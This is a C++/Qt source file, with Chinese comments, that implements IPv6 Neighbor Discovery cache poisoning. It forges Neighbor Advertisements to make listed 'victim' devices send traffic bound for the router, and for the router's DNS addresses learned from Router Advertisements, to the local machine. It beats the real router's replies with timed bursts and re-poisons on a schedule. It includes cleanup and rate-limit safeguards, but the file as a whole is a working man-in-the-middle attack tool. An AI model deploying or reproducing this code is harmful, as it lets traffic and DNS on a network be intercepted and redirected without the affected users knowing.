#include "NdpSpoofer.h"

#include "IL2Endpoint.h"

#include <QDebug>
#include <QHostAddress>
#include <QTimer>

#include <cstring>

// 各时间常量与 ArpSpoofer 一一对齐（理由见 ArpSpoofer.cpp 顶部）：主力是「一问就抢答」+「一解毒就
// 反制」，周期重投只作兜底；heal 连发数遍抵消滞留缓存；唤醒沿 50ms×8 高频窗口压过过渡期。
static constexpr int kSpoofIntervalMs = 1000;
static constexpr int kHealRepeat = 3;
static constexpr int kBoostIntervalMs = 50;
static constexpr int kBoostTicks = 8;
static constexpr int kAnswerBurstDelay1Ms = 5;
static constexpr int kAnswerBurstDelay2Ms = 18;
// 除路由器 LL 外，最多额外投毒/抢答/还原多少个路由器地址（从 RA 的 RDNSS 学到）。设上限的目的是
// **限爆炸半径**：即便调用方的前缀过滤被伪造 RA 绕过，也顶多多喷这么几条，不至于被灌爆内存/带宽。
// 家用/企业路由器给的 RDNSS 一般 1~2 个，8 足够宽松。
static constexpr int kMaxRouterExtra = 8;
// 解析 RA 的 RDNSS 时最多抽多少个地址（纯限工作量；真正的取舍/上限在调用方筛完后 setRouterExtraAddrs）。
static constexpr int kMaxRdnssParse = 16;

// ICMPv6 NDP 帧各字段偏移（含 14 字节以太头）。NDP 报文永远没有扩展头，next header 恒在固定位置。
static constexpr int kEthLen = 14;
static constexpr int kIp6Len = 40;
static constexpr int kOffEthType = 12;      // 以太类型
static constexpr int kOffIp6NextHdr = kEthLen + 6;  // = 20
static constexpr int kOffIp6Src = kEthLen + 8;      // = 22
static constexpr int kOffIcmp6Type = kEthLen + kIp6Len;         // = 54
static constexpr int kOffNsTarget = kOffIcmp6Type + 8;          // = 62（NS 的 target 地址）
static constexpr quint8 kNextHdrIcmp6 = 58;
static constexpr quint8 kIcmp6TypeNs = 135;
static constexpr quint8 kIcmp6TypeNa = 136;
static constexpr quint8 kIcmp6TypeRa = 134;
// NA 标志位（报文第 4 字节的高 3 位）：Router / Solicited / Override。
static constexpr quint8 kNaRouter = 0x80;
static constexpr quint8 kNaSolicited = 0x40;
static constexpr quint8 kNaOverride = 0x20;

namespace {
// 6 字节 MAC → "aa:bb:cc:dd:ee:ff"（macToBytes 的逆；RA 学习把解析出的 MAC 交回给上层用串表示，
// 与 NicSpec/configure 的既有约定一致）。长度不对返回空串。
QString macToStr(const QByteArray &mac)
{
    if (mac.size() != 6)
        return {};
    QString out;
    out.reserve(17);
    for (int i = 0; i < 6; ++i) {
        if (i)
            out += QLatin1Char(':');
        out += QString("%1").arg(quint8(mac[i]), 2, 16, QLatin1Char('0'));
    }
    return out;
}

// 16 位反码校验和（与 NetStack::ipChecksum 同实现）。
quint16 onesComplement(const uchar *data, int len)
{
    quint32 sum = 0;
    for (int i = 0; i + 1 < len; i += 2)
        sum += (quint32(data[i]) << 8) | data[i + 1];
    if (len & 1)
        sum += quint32(data[len - 1]) << 8;
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);
    return static_cast<quint16>(~sum);
}
// all-nodes 链路本地组播 ff02::1（16 字节）。
QByteArray allNodes()
{
    QByteArray a(16, char(0));
    a[0] = char(0xFF);
    a[1] = char(0x02);
    a[15] = char(0x01);
    return a;
}
} // namespace

NdpSpoofer::NdpSpoofer(IL2Endpoint *endpoint, QObject *parent)
    : QObject(parent), m_endpoint(endpoint), m_timer(new QTimer(this)),
      m_boostTimer(new QTimer(this))
{
    m_timer->setInterval(kSpoofIntervalMs);
    connect(m_timer, &QTimer::timeout, this, &NdpSpoofer::tick);
    m_boostTimer->setInterval(kBoostIntervalMs);
    m_boostTimer->setTimerType(Qt::PreciseTimer); // 与 ArpSpoofer 的 boost 同理，见那里的注释
    connect(m_boostTimer, &QTimer::timeout, this, &NdpSpoofer::boostTick);
}

NdpSpoofer::~NdpSpoofer()
{
    healAll(); // 兜底还原，避免留人 v6 断网
}

bool NdpSpoofer::configured() const
{
    return m_localMac.size() == 6 && m_routerLL.size() == 16 && m_routerMac.size() == 6;
}

void NdpSpoofer::configure(const QString &localMac, const QString &routerLinkLocal,
                           const QString &routerMac)
{
    m_localMac = macToBytes(localMac);
    m_routerLL = ip6ToBytes(routerLinkLocal);
    m_routerMac = macToBytes(routerMac);
    // ★ 只在**状态翻转**时说一次。configure 被每轮扫描调用（真机实测每 ~5s、每网卡一次），
    //   原来无条件 qWarning 让一条 70 秒的日志里刷了 30 遍同样的话，把真正有信息的行淹掉。
    //   措辞也一并改：绝大多数情况根本不是「配置无效」，而是**本机没有 v6 默认路由**
    //   （典型：net.ipv6.conf.<if>.accept_ra=0，真机实证过），这时链路上可能照样有 v6 路由器 ——
    //   所以现在会先等 RA 学（见 LanGateway 的 learnRouterFromRa），学到就自动转好。
    const bool ok = configured();
    if (ok != m_lastConfigOk || !m_configLogged) {
        m_lastConfigOk = ok;
        m_configLogged = true;
        if (ok)
            qInfo() << "NdpSpoofer: v6 拓扑就绪，投毒启用" << routerLinkLocal << routerMac;
        else
            qWarning() << "NdpSpoofer: 无可用 v6 路由器，该卡 v6 劫持停用（等待从线上 RA 学到）"
                       << "local=" << localMac << "routerLL=" << routerLinkLocal
                       << "routerMac=" << routerMac;
    }
}

bool NdpSpoofer::isSpoofedTarget(const QByteArray &target16) const
{
    if (target16.size() != 16)
        return false;
    if (m_routerLL.size() == 16 && target16 == m_routerLL)
        return true;
    for (const QByteArray &e : m_routerExtra)
        if (target16 == e)
            return true;
    return false;
}

void NdpSpoofer::setRouterExtraAddrs(const QVector<QByteArray> &addrs)
{
    // 规整：只留 16 字节、剔掉与 LL 重复的、去重、并强制上限（防伪造 RA 灌爆——调用方已按前缀筛过，
    // 这里是纵深防御的最后一道）。
    QVector<QByteArray> next;
    for (const QByteArray &a : addrs) {
        if (a.size() != 16)
            continue;
        if (m_routerLL.size() == 16 && a == m_routerLL)
            continue; // LL 已由主路径覆盖，不重复
        bool dup = false;
        for (const QByteArray &e : next)
            if (e == a) {
                dup = true;
                break;
            }
        if (dup)
            continue;
        next.append(a);
        if (next.size() >= kMaxRouterExtra)
            break;
    }

    // ★ 安全关键：**被移除的地址必须先还原**。若某地址这次不再在集合里，而我们之前一直在投毒它，
    //   不 heal 就会把「该地址 → 本机 MAC」永久留在设备邻居缓存里 → 该设备连不上这个地址（含 v6 DNS）。
    //   与漏 healOne 同罪，所以这里对每个在册 victim 逐个还原被摘掉的地址。
    if (configured()) {
        for (const QByteArray &old : m_routerExtra) {
            bool kept = false;
            for (const QByteArray &e : next)
                if (e == old) {
                    kept = true;
                    break;
                }
            if (!kept)
                for (auto it = m_victims.constBegin(); it != m_victims.constEnd(); ++it)
                    healTarget(it.value(), old);
        }
    }

    // 找出新增的地址（用于立刻抢投），再切换集合。
    QVector<QByteArray> added;
    for (const QByteArray &a : next) {
        bool existed = false;
        for (const QByteArray &e : m_routerExtra)
            if (e == a) {
                existed = true;
                break;
            }
        if (!existed)
            added.append(a);
    }
    m_routerExtra = next;

    // 新增地址：立刻对所有 victim 抢投一份，不必等下个 1s tick（否则新学到的 DNS 地址要慢一拍才被劫）。
    if (configured() && m_endpoint && !added.isEmpty()) {
        for (auto it = m_victims.constBegin(); it != m_victims.constEnd(); ++it)
            for (const QByteArray &a : added)
                m_endpoint->send(buildSpoofNa(it.value(), a));
        m_endpoint->flushTx();
    }
}

void NdpSpoofer::startSpoof(const QString &victimMac)
{
    if (!configured()) {
        qWarning() << "NdpSpoofer: 未配置，忽略 startSpoof" << victimMac;
        return;
    }
    const QByteArray vmac = macToBytes(victimMac);
    if (vmac.size() != 6) {
        qWarning() << "NdpSpoofer: victim MAC 非法，忽略" << victimMac;
        return;
    }
    m_victims.insert(victimMac.toLower(), vmac);
    sendSpoof(vmac); // 立刻抢占一次
    if (!m_timer->isActive())
        m_timer->start();
}

void NdpSpoofer::stopSpoof(const QString &victimMac)
{
    const auto it = m_victims.find(victimMac.toLower());
    if (it == m_victims.end())
        return;
    if (configured())
        healOne(it.value());
    m_victimLL.remove(it.value());
    m_victims.erase(it);
    if (m_victims.isEmpty()) {
        if (m_timer->isActive())
            m_timer->stop();
        if (m_boostTimer && m_boostTimer->isActive())
            m_boostTimer->stop();
        m_boostRemaining = 0;
    }
}

void NdpSpoofer::healAll()
{
    if (configured()) {
        for (auto it = m_victims.constBegin(); it != m_victims.constEnd(); ++it)
            healOne(it.value());
    }
    m_victims.clear();
    m_victimLL.clear();
    if (m_timer && m_timer->isActive())
        m_timer->stop();
    if (m_boostTimer && m_boostTimer->isActive())
        m_boostTimer->stop();
    m_boostRemaining = 0;
}

bool NdpSpoofer::answerNeighborSolicit(const QByteArray &frame)
{
    if (!m_endpoint || !configured())
        return false;
    // 至少要装下 以太(14)+IPv6(40)+NS 头(8)+target(16) = 78 字节。
    if (frame.size() < kOffNsTarget + 16)
        return false;
    const uchar *f = reinterpret_cast<const uchar *>(frame.constData());
    if (f[kOffEthType] != 0x86 || f[kOffEthType + 1] != 0xDD)
        return false;
    if (f[kOffIp6NextHdr] != kNextHdrIcmp6) // 只认「无扩展头」的 NDP（NDP 从不带扩展头）
        return false;
    if (f[kOffIcmp6Type] != kIcmp6TypeNs)
        return false;
    // 只对「问的正是我们冒充的某个路由器地址」抢答：路由器 LL，**或**从 RA 学到的路由器链上全局地址。
    // ★ 后者是这次补洞的关键：设备的 v6 DNS 服务器是路由器的链上全局地址，它**直接 NS 解析该地址**
    //   （不经默认路由器），只有在这里抢答才能把它的 v6 DNS 引进网关；否则真路由器应答、整段绕过。
    const QByteArray target(reinterpret_cast<const char *>(f + kOffNsTarget), 16);
    if (!isSpoofedTarget(target))
        return false;

    const QByteArray senderMac(reinterpret_cast<const char *>(f + 6), 6);
    QByteArray senderIp(reinterpret_cast<const char *>(f + kOffIp6Src), 16);
    // 源地址为 ::（DAD 阶段的 NS）→ 无法单播回它，放弃抢答（真路由器会处理 DAD）。
    bool allZero = true;
    for (int i = 0; i < 16; ++i)
        if (senderIp[i] != 0) {
            allZero = false;
            break;
        }
    if (allZero)
        return false;

    // 记住 victim 的链路本地源地址：heal 时要向它**单播** solicited NA 才能覆盖 REACHABLE 表项。
    m_victimLL.insert(senderMac, senderIp);

    // 回一帧 solicited NA：dst = 发起者，src/target = **被问的那个路由器地址**（LL 或额外全局地址），
    // TLLA = 本机 MAC，R+S+O 全置 → 设备把「该地址在本机 MAC」采信为最新。
    const QByteArray na = buildNa(senderMac, m_localMac, target, senderIp, target,
                                  m_localMac, kNaRouter | kNaSolicited | kNaOverride);
    // 短促连发（同 ArpSpoofer）：当场两帧 + 5ms/18ms 各补一帧，压过真路由器对同一 NS 的应答。
    m_endpoint->send(na);
    m_endpoint->send(na);
    QTimer::singleShot(kAnswerBurstDelay1Ms, this, [this, na, senderMac] {
        if (m_endpoint && hasVictimMac(senderMac)) {
            m_endpoint->send(na);
            m_endpoint->flushTx(); // 同 ArpSpoofer 的抢答补帧，理由见那里
        }
    });
    QTimer::singleShot(kAnswerBurstDelay2Ms, this, [this, na, senderMac] {
        if (m_endpoint && hasVictimMac(senderMac)) {
            m_endpoint->send(na);
            m_endpoint->flushTx(); // 同 ArpSpoofer 的抢答补帧，理由见那里
        }
    });
    return true;
}

void NdpSpoofer::reassertNow()
{
    if (!m_endpoint || !configured() || m_victims.isEmpty())
        return;
    if (m_lastReassert.isValid() && m_lastReassert.elapsed() < 50)
        return; // 节流：真路由器短时连发多条 NDP 时别放大成风暴
    m_lastReassert.restart();
    for (auto it = m_victims.constBegin(); it != m_victims.constEnd(); ++it)
        sendSpoof(it.value());
}

void NdpSpoofer::startBoost()
{
    if (!configured() || m_victims.isEmpty())
        return;
    for (auto it = m_victims.constBegin(); it != m_victims.constEnd(); ++it)
        sendSpoof(it.value());
    m_boostRemaining = kBoostTicks;
    if (m_boostTimer && !m_boostTimer->isActive())
        m_boostTimer->start();
}

void NdpSpoofer::boostTick()
{
    if (!configured() || m_victims.isEmpty()) {
        if (m_boostTimer)
            m_boostTimer->stop();
        m_boostRemaining = 0;
        return;
    }
    for (auto it = m_victims.constBegin(); it != m_victims.constEnd(); ++it)
        sendSpoof(it.value());
    if (--m_boostRemaining <= 0 && m_boostTimer)
        m_boostTimer->stop();
}

bool NdpSpoofer::isRouterAdvertOrNa(const QByteArray &frame)
{
    if (frame.size() < kOffIcmp6Type + 1)
        return false;
    const uchar *f = reinterpret_cast<const uchar *>(frame.constData());
    if (f[kOffEthType] != 0x86 || f[kOffEthType + 1] != 0xDD)
        return false;
    if (f[kOffIp6NextHdr] != kNextHdrIcmp6)
        return false;
    const quint8 t = f[kOffIcmp6Type];
    return t == kIcmp6TypeRa || t == kIcmp6TypeNa;
}

bool NdpSpoofer::isRouterAdvert(const QByteArray &frame)
{
    if (frame.size() < kOffIcmp6Type + 1)
        return false;
    const uchar *f = reinterpret_cast<const uchar *>(frame.constData());
    return f[kOffEthType] == 0x86 && f[kOffEthType + 1] == 0xDD
        && f[kOffIp6NextHdr] == kNextHdrIcmp6 && f[kOffIcmp6Type] == kIcmp6TypeRa;
}

bool NdpSpoofer::parseRouterAdvert(const QByteArray &frame, QString *routerLL, QString *routerMac,
                                   QByteArray *prefixNet, int *prefixLen,
                                   QVector<QByteArray> *rdnss)
{
    if (prefixLen)
        *prefixLen = -1;
    if (!isRouterAdvert(frame))
        return false;
    // RA 固定部分：type(1) code(1) cksum(2) curHopLimit(1) flags(1) routerLifetime(2)
    //              reachableTime(4) retransTimer(4) = 16 字节，之后是选项。
    static constexpr int kRaFixedLen = 16;
    static constexpr int kOffIp6HopLimit = kEthLen + 7;
    static constexpr int kOffRaLifetime = kOffIcmp6Type + 6;
    if (frame.size() < kOffIcmp6Type + kRaFixedLen)
        return false;
    const uchar *f = reinterpret_cast<const uchar *>(frame.constData());

    // NDP 强制 hop limit 255：跨网段伪造的 RA 到这里必然 <255，直接拒（RFC 4861 §6.1.2）。
    if (f[kOffIp6HopLimit] != 255)
        return false;
    // Router Lifetime==0 = 「我不是默认路由器」（只来发前缀/MTU 信息）。拿它当投毒目标会把设备的
    // 默认路由指向一台根本不转发的机器 —— 比不投毒还糟。
    const quint16 lifetime = (quint16(f[kOffRaLifetime]) << 8) | f[kOffRaLifetime + 1];
    if (lifetime == 0)
        return false;
    // 源地址必须是链路本地：投毒 NA 的 target 就是它，写全局地址设备不会拿它当默认路由器。
    if (f[kOffIp6Src] != 0xFE || (f[kOffIp6Src + 1] & 0xC0) != 0x80)
        return false;

    if (routerLL) {
        Q_IPV6ADDR raw;
        std::memcpy(raw.c, f + kOffIp6Src, 16);
        *routerLL = QHostAddress(raw).toString();
    }
    // 默认路由器 MAC：先回落到以太源 MAC（RA 由路由器自己发出，源 MAC 就是它），
    // 若带 SLLA 选项则以选项为准（更权威：跨网桥/中继时以太源 MAC 可能被改写）。
    if (routerMac)
        *routerMac = macToStr(QByteArray(reinterpret_cast<const char *>(f) + 6, 6));

    // 走选项链：每项 type(1) len(1，单位 8 字节) + 数据。len==0 非法（会死循环），必须拒。
    int p = kOffIcmp6Type + kRaFixedLen;
    while (p + 2 <= frame.size()) {
        const int type = f[p];
        const int len8 = f[p + 1];
        if (len8 == 0)
            break;
        const int optLen = len8 * 8;
        if (p + optLen > frame.size())
            break; // 选项越界：后面的不可信，用已解析到的收工
        if (type == 1 && optLen >= 8 && routerMac) { // Source Link-Layer Address
            *routerMac = macToStr(QByteArray(reinterpret_cast<const char *>(f) + p + 2, 6));
        } else if (type == 3 && optLen >= 32 && prefixNet && prefixLen) { // Prefix Information
            const int plen = f[p + 2];
            const quint8 flags = f[p + 3];
            // 只取 on-link(L) 位的前缀：它才代表「这个前缀内的地址在本链路上直连可达」，
            // 也正是 LAN 内 v6 直连旁路要的判据。只有 A(autonomous) 没有 L 的前缀不算。
            if ((flags & 0x80) && plen > 0 && plen <= 128) {
                *prefixNet = QByteArray(reinterpret_cast<const char *>(f) + p + 16, 16);
                *prefixLen = plen;
            }
        } else if (type == 25 && optLen >= 24 && rdnss) { // RDNSS（RFC 8106）：递归 DNS 服务器地址
            // 布局：type(1) len(1) reserved(2) lifetime(4) 之后 N×16 字节地址；地址数 = (len8-1)/2。
            // 这些正是设备会拿去做 DNS 的地址（常为路由器**链上全局地址**）。原样抽出，**不在这里做
            // 前缀/全局过滤**——调用方掌握本网卡前缀，由它筛（见类顶注释与 LanGateway::learnRouterFromRa）。
            const int naddr = (len8 - 1) / 2;
            for (int i = 0; i < naddr && rdnss->size() < kMaxRdnssParse; ++i) {
                const int off = p + 8 + i * 16;
                if (off + 16 > frame.size())
                    break;
                rdnss->append(QByteArray(reinterpret_cast<const char *>(f) + off, 16));
            }
        }
        p += optLen;
    }
    return true;
}

QStringList NdpSpoofer::victims() const
{
    return m_victims.keys();
}

void NdpSpoofer::tick()
{
    if (!configured())
        return;
    for (auto it = m_victims.constBegin(); it != m_victims.constEnd(); ++it)
        sendSpoof(it.value());
}

QByteArray NdpSpoofer::buildSpoofNa(const QByteArray &victimMac6, const QByteArray &targetIp6) const
{
    // 「维持型」投毒 NA：L3 目的 = ff02::1（all-nodes 组播，设备是成员必处理），L2 目的 = victim 单播
    //  MAC（只此设备收得到，不污染全网）。target/src = 某路由器地址、TLLA = 本机 MAC、R+O。
    // ★ 这里**只用非请求(S=0)**：solicited NA 必须单播（组播 solicited 是非法帧、会被丢），所以周期
    //   组播 NA 不能带 S。它的作用是「维持」——把设备**非 REACHABLE**（STALE 等）的表项持续压在本机
    //   MAC 上。真正把 REACHABLE 表项翻过来的是抢答 NS 那条**单播 solicited** NA（answerNeighborSolicit）
    //   和 heal 的单播 NA。这与设备实际会主动 NS 解析网关（首用/老化后）相吻合。
    return buildNa(victimMac6, m_localMac, targetIp6, allNodes(), targetIp6, m_localMac,
                   kNaRouter | kNaOverride);
}

void NdpSpoofer::sendSpoof(const QByteArray &victimMac6)
{
    if (!m_endpoint || !configured())
        return;
    // 主目标：路由器**链路本地**地址——默认路由走它，一般 off-link 上网流量靠这条覆盖。
    m_endpoint->send(buildSpoofNa(victimMac6, m_routerLL));
    // ★ 额外目标：路由器的**链上(on-link)全局地址**（从 RA 的 RDNSS 学到）。设备的 v6 DNS 服务器
    //   常是这个地址；它是链上地址，设备会**直接 NS 解析、不经默认路由器**，所以必须单独持续投毒，
    //   否则 v6 DNS（乃至发往路由器全局地址的一切流量）整段绕过网关。
    for (const QByteArray &t : m_routerExtra)
        m_endpoint->send(buildSpoofNa(victimMac6, t));
    m_endpoint->flushTx(); // 由 1s tick / 50ms boost 两个定时器回调驱动，不在收帧排空路径上
}

void NdpSpoofer::healOne(const QByteArray &victimMac6)
{
    if (!m_endpoint)
        return;
    // 主目标：路由器链路本地地址。
    healTarget(victimMac6, m_routerLL);
    // ★ 学到的每个额外路由器地址（RDNSS 链上全局地址）也**必须一并还原**回真路由器 MAC。漏这条 =
    //   撤劫持/退出后设备邻居缓存里「路由器全局地址 → 本机 MAC」残留，设备再也连不上路由器自身
    //   （含 v6 DNS）——IPv4 侧吃过一模一样的亏（见「重启后代理恢复四修」）。与 LL 走同一套还原逻辑。
    for (const QByteArray &t : m_routerExtra)
        healTarget(victimMac6, t);
}

void NdpSpoofer::healTarget(const QByteArray &victimMac6, const QByteArray &targetIp6)
{
    if (!m_endpoint || targetIp6.size() != 16 || m_localMac.size() != 6 || m_routerMac.size() != 6)
        return;
    // 把设备缓存里「targetIp6 → 本机 MAC」还原回「targetIp6 → 真实路由器 MAC」——发一条 override NA
    //（target=targetIp6、TLLA=真实路由器 MAC、O 置位）。targetIp6 可能是路由器 LL，也可能是学到的额外
    //   链上全局地址（RDNSS）——两者共用本函数，绝不各写一份。这是 v4 侧无偿 ARP heal 的 v6 对应物：带
    //   Override 的 NA 会被内核当权威更新，直接把邻居缓存那条改回真路由器 MAC，**即使表项当前是
    //   REACHABLE**。真机实测（真路由器 + REACHABLE 投毒态）两大客户端族都**即时翻回、无死 MAC 窗口**：
    //     · macOS（BSD 邻居栈）：单播 solicited+override 到设备 LL → 直接 REACHABLE，实测 +0.24s 翻回；
    //     · Linux 6.8（Android 同内核）：组播(L2 单播 victim) override(S=0) → 先落 STALE（下一包即用真
    //       路由器 MAC、零中断），设备一用就 DELAY→REACHABLE，实测 +0.20s 翻回。
    //   ★ 早先「Linux 撼不动 REACHABLE、heal 只能尽力而为」的结论是**合成台架的假象**（假路由器无真
    //   响应者 + 混杂/内核本地直投等坑），非内核铁律——真路由器 + 真客户端上不成立。
    //   记到设备 LL（抢答过它 NS）时优先单播 solicited+override（最强、直接 REACHABLE）；否则退回组播
    //   (L2 单播 victim) override。eth-src 用本机真实 MAC（NDP 只按载荷校验，与 eth 源无关）。
    const QByteArray ll = m_victimLL.value(victimMac6);
    const QByteArray na = (ll.size() == 16)
            ? buildNa(victimMac6, m_localMac, targetIp6, ll, targetIp6, m_routerMac,
                      kNaRouter | kNaSolicited | kNaOverride)
            : buildNa(victimMac6, m_localMac, targetIp6, allNodes(), targetIp6, m_routerMac,
                      kNaRouter | kNaOverride);
    for (int i = 0; i < kHealRepeat; ++i)
        m_endpoint->send(na);
    // ★ 还原帧必须立刻出网卡（同 ArpSpoofer::healOne）：这条路径跑在撤劫持/退出/睡眠上，
    //   攒在批量队列里等下一个 flushTx 点是赌运气 —— 端点随后就可能被 close()/析构。
    m_endpoint->flushTx();
}

bool NdpSpoofer::hasVictimMac(const QByteArray &mac6) const
{
    for (const QByteArray &m : m_victims)
        if (m == mac6)
            return true;
    return false;
}

QByteArray NdpSpoofer::macToBytes(const QString &mac)
{
    const QStringList parts = mac.split(QLatin1Char(':'));
    if (parts.size() != 6)
        return {};
    QByteArray out(6, char(0));
    for (int i = 0; i < 6; ++i) {
        bool ok = false;
        const uint v = parts.at(i).toUInt(&ok, 16);
        if (!ok || v > 0xFFu)
            return {};
        out[i] = static_cast<char>(v);
    }
    return out;
}

QByteArray NdpSpoofer::ip6ToBytes(const QString &ip)
{
    QHostAddress addr(ip);
    if (addr.isNull() || addr.protocol() != QAbstractSocket::IPv6Protocol)
        return {};
    const Q_IPV6ADDR v6 = addr.toIPv6Address(); // c[0..15] 网络序
    return QByteArray(reinterpret_cast<const char *>(v6.c), 16);
}

QByteArray NdpSpoofer::buildNa(const QByteArray &ethDst, const QByteArray &ethSrc,
                               const QByteArray &srcIp6, const QByteArray &dstIp6,
                               const QByteArray &targetIp6, const QByteArray &tllaMac,
                               quint8 flags)
{
    // 载荷 = ICMPv6 NA(8 头 + 16 target) + TLLA 选项(8) = 32 字节。总帧 14+40+32 = 86。
    constexpr int kIcmpLen = 32;
    QByteArray f(kEthLen + kIp6Len + kIcmpLen, char(0));
    uchar *b = reinterpret_cast<uchar *>(f.data());
    // 以太头
    std::memcpy(b, ethDst.constData(), 6);
    std::memcpy(b + 6, ethSrc.constData(), 6);
    b[12] = 0x86;
    b[13] = 0xDD;
    // IPv6 头
    uchar *ip = b + kEthLen;
    ip[0] = 0x60;                       // version=6
    ip[4] = (kIcmpLen >> 8) & 0xFF;     // payload length
    ip[5] = kIcmpLen & 0xFF;
    ip[6] = kNextHdrIcmp6;              // next header = ICMPv6
    ip[7] = 255;                        // hop limit（NDP 必须为 255，收方据此拒收被转发的伪造包）
    std::memcpy(ip + 8, srcIp6.constData(), 16);
    std::memcpy(ip + 24, dstIp6.constData(), 16);
    // ICMPv6 NA
    uchar *ic = ip + kIp6Len;
    ic[0] = kIcmp6TypeNa;
    ic[1] = 0;             // code
    ic[2] = 0;             // checksum 占位
    ic[3] = 0;
    ic[4] = flags & 0xE0;  // R/S/O
    std::memcpy(ic + 8, targetIp6.constData(), 16);
    ic[24] = 2;            // 选项类型：Target Link-Layer Address
    ic[25] = 1;            // 选项长度：1（单位 8 字节）
    std::memcpy(ic + 26, tllaMac.constData(), 6);
    // 校验和（含 IPv6 伪首部）
    const quint16 ck = icmp6Checksum(srcIp6, dstIp6, ic, kIcmpLen);
    ic[2] = (ck >> 8) & 0xFF;
    ic[3] = ck & 0xFF;
    return f;
}

quint16 NdpSpoofer::icmp6Checksum(const QByteArray &srcIp6, const QByteArray &dstIp6,
                                  const uchar *icmp, int icmpLen)
{
    // 伪首部：src(16) + dst(16) + upper-layer-len(4, 大端) + zero(3) + next-header(1=58)。
    QByteArray pseudo;
    pseudo.reserve(40 + icmpLen);
    pseudo.append(srcIp6);
    pseudo.append(dstIp6);
    pseudo.append(char((icmpLen >> 24) & 0xFF));
    pseudo.append(char((icmpLen >> 16) & 0xFF));
    pseudo.append(char((icmpLen >> 8) & 0xFF));
    pseudo.append(char(icmpLen & 0xFF));
    pseudo.append(char(0));
    pseudo.append(char(0));
    pseudo.append(char(0));
    pseudo.append(char(kNextHdrIcmp6));
    pseudo.append(reinterpret_cast<const char *>(icmp), icmpLen);
    return onesComplement(reinterpret_cast<const uchar *>(pseudo.constData()), pseudo.size());
}
